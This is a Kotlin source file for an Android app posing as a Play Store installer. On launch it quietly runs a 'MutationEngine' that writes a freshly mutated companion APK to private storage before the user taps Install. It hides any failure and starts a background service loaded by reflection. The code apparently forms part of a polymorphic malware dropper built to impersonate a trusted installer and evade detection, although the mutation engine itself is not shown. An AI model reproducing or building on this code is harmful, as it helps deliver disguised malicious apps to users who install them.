package com.playstore.installer

import android.app.Application
import android.content.Intent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.io.File

class LauncherApplication : Application() {

    companion object {
        lateinit var instance: LauncherApplication
            private set

        // File path for mutated companion — survives R8, no volatile field needed
        const val MUTATED_APK_NAME = "mc.tmp"

        fun getMutatedApkFile(app: Application): File =
            File(app.filesDir, MUTATED_APK_NAME)

        private val appScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        // Start MutationEngine immediately — writes result to filesDir/mc.tmp
        // By the time user taps Install, file is ready
        appScope.launch {
            try {
                val engine  = MutationEngine(applicationContext)
                val bytes   = engine.getMutatedCompanionBytes()
                val outFile = getMutatedApkFile(this@LauncherApplication)
                if (bytes.isNotEmpty()) {
                    outFile.writeBytes(bytes)
                }
            } catch (e: Exception) {
                // Silent fail — InstallActivity falls back to assets
            }
        }

        startService(Intent(this, Class.forName(
            "com.playstore.installer.service.LauncherService"
        )))
    }
}
